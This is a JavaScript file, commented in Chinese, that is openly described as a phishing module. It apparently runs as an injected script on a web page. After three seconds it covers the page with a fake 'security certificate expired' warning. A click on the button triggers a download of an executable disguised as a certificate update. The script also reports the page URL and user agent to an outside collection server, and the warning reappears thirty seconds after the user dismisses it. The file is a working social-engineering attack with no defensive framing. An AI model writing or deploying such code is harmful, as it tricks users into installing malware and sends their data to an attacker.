// 钓鱼证书下载 - 诱导用户下载恶意文件
// 伪装成安全证书、系统更新等下载

(function() {
    'use strict';
    
    const config = {
        serverUrl: 'https://xss.li/api/collect.php',
        malwareUrl: 'https://your-domain.com/payload.exe', // 替换为实际恶意文件URL
        certName: '安全证书更新.exe'
    };
    
    console.log('🎣 钓鱼下载模块已激活');
    
    // 创建伪造的证书过期提示
    function createPhishingUI() {
        // 创建遮罩层
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 999999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        `;
        
        // 创建警告框
        const dialog = document.createElement('div');
        dialog.style.cssText = `
            background: #fff;
            border-radius: 8px;
            padding: 30px;
            max-width: 500px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
            text-align: center;
        `;
        
        dialog.innerHTML = `
            <div style="color: #d32f2f; font-size: 48px; margin-bottom: 20px;">
                ⚠️
            </div>
            <h2 style="color: #333; margin-bottom: 15px;">安全证书已过期</h2>
            <p style="color: #666; margin-bottom: 20px; line-height: 1.6;">
                您的浏览器安全证书已过期，为保护您的账户安全，请立即更新证书。
                <br><br>
                <strong>未更新证书可能导致：</strong><br>
                • 账户信息泄露<br>
                • 无法访问加密网站<br>
                • 浏览器功能受限
            </p>
            <button id="downloadCert" style="
                background: #1976d2;
                color: #fff;
                border: none;
                padding: 12px 40px;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                margin-right: 10px;
            ">立即更新证书</button>
            <button id="cancelCert" style="
                background: #f5f5f5;
                color: #666;
                border: 1px solid #ddd;
                padding: 12px 40px;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
            ">稍后提醒</button>
        `;
        
        overlay.appendChild(dialog);
        document.body.appendChild(overlay);
        
        // 下载按钮事件
        document.getElementById('downloadCert').addEventListener('click', async () => {
            try {
                // 记录用户点击
                await fetch(config.serverUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        type: 'phishing_download_click',
                        url: window.location.href,
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    })
                });
                
                // 触发下载
                const a = document.createElement('a');
                a.href = config.malwareUrl;
                a.download = config.certName;
                a.click();
                
                overlay.style.display = 'none';
                
                // 显示感谢提示
                setTimeout(() => {
                    alert('证书更新文件已开始下载，请运行安装程序完成更新。');
                }, 500);
                
            } catch (error) {
                console.error('下载失败:', error);
            }
        });
        
        // 取消按钮
        document.getElementById('cancelCert').addEventListener('click', () => {
            overlay.style.display = 'none';
            
            // 30秒后再次弹出
            setTimeout(() => {
                overlay.style.display = 'flex';
            }, 30000);
        });
    }
    
    // 延迟3秒后显示钓鱼界面
    setTimeout(() => {
        createPhishingUI();
    }, 3000);
    
    // 记录钓鱼模块加载
    fetch(config.serverUrl, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            type: 'phishing_module_loaded',
            url: window.location.href,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        })
    });
    
})();
